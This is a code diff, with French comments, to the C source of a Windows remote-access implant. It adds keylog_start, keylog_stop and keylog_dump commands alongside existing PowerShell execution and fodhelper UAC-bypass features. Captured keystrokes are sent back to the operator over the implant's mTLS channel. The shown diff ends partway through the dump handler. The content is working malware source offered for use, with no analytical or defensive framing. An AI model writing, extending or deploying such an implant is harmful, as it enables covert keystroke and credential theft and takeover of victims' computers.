@@ -24,6 +24,9 @@
  *   ps <commande>        — exécution via PowerShell (T1059.001)
  *   elevate              — UAC bypass fodhelper auto (T1548.002)
  *   privesc <exe_path>   — UAC bypass fodhelper manuel (T1548.002)
+ *   keylog_start         — démarre le keylogger (T1056.001)
+ *   keylog_stop          — arrête le keylogger (T1056.001)
+ *   keylog_dump          — récupère les frappes capturées (T1056.001)
  *   exit                 — arrêt propre de l'implant
  *
  * Modes de compilation :
@@ -44,6 +47,7 @@
  *   T1548.002 — Abuse Elevation Control Mechanism: Bypass UAC
  *   T1071.001 — Application Layer Protocol (HTTPS/TLS)
  *   T1573.001 — Encrypted Channel (mTLS)
+ *   T1056.001 — Input Capture: Keylogging
  */
 
 #ifdef _WIN32
@@ -54,7 +58,11 @@
 
 #include "tls.h"
 #include "privesc.h"
+#ifdef _WIN32
+#include "keylog.h"
+#endif
 #include <stdio.h>
+#include <stdlib.h>
 #include <string.h>
 
 /* Mode standalone : les certificats sont embarqués dans le binaire
@@ -211,6 +219,9 @@ int main(void) {
 
             /* exit — arrêt propre de l'implant */
             if (strcmp(cmd, "exit") == 0) {
+#ifdef _WIN32
+                keylog_stop();
+#endif
                 tls_send(c, "BYE", 3);
                 tls_close(c);
                 tls_cleanup();
@@ -279,6 +290,73 @@ int main(void) {
                     out_len = snprintf(buf, BUFFER_SIZE - 4,
                         "[privesc] error — fodhelper launch failed "
                         "(code %d)\r\n", rc);
+                buf[out_len]     = '\x00';
+                buf[out_len + 1] = 'E';
+                buf[out_len + 2] = 'N';
+                buf[out_len + 3] = 'D';
+                tls_send(c, buf, out_len + 4);
+                continue;
+            }
+
+            /* keylog_start — démarre le keylogger (T1056.001) */
+            if (strcmp(cmd, "keylog_start") == 0) {
+#ifdef _WIN32
+                const char *msg = (keylog_start() == 0)
+                    ? "[keylogger started]\r\n"
+                    : "[keylogger already running]\r\n";
+#else
+                const char *msg = "[keylogger] not supported on this platform\r\n";
+#endif
+                int out_len = (int)strlen(msg);
+                memcpy(buf, msg, out_len);
+                buf[out_len]     = '\x00';
+                buf[out_len + 1] = 'E';
+                buf[out_len + 2] = 'N';
+                buf[out_len + 3] = 'D';
+                tls_send(c, buf, out_len + 4);
+                continue;
+            }
+
+            /* keylog_stop — arrête le keylogger (T1056.001) */
+            if (strcmp(cmd, "keylog_stop") == 0) {
+#ifdef _WIN32
+                const char *msg = (keylog_stop() == 0)
+                    ? "[keylogger stopped]\r\n"
+                    : "[keylogger not running]\r\n";
+#else
+                const char *msg = "[keylogger] not supported on this platform\r\n";
+#endif
+                int out_len = (int)strlen(msg);
+                memcpy(buf, msg, out_len);
+                buf[out_len]     = '\x00';
+                buf[out_len + 1] = 'E';
+                buf[out_len + 2] = 'N';
+                buf[out_len + 3] = 'D';
+                tls_send(c, buf, out_len + 4);
+                continue;
+            }
+
+            /* keylog_dump — récupère les frappes capturées (T1056.001) */
+            if (strcmp(cmd, "keylog_dump") == 0) {
+                int out_len;
+#ifdef _WIN32
+                char *dump = keylog_dump();
+                if (dump) {
+                    out_len = (int)strlen(dump);
+                    if (out_len > BUFFER_SIZE - 4)
+                        out_len = BUFFER_SIZE - 4;
+                    memcpy(buf, dump, out_len);
+                    free(dump);
+                } else {
+                    const char *e = "[keylogger] error\r\n";
+                    out_len = (int)strlen(e);
+                    memcpy(buf, e, out_len);
+                }
+#else
+                const char *msg = "[keylogger] not supported on this platform\r\n";
+                out_len = (int)strlen(msg);
+                memcpy(buf, msg, out_len);
+#endif
                 buf[out_len]     = '\x00';
                 buf[out_len + 1] = 'E';
                 buf[out_len + 2] = 'N';
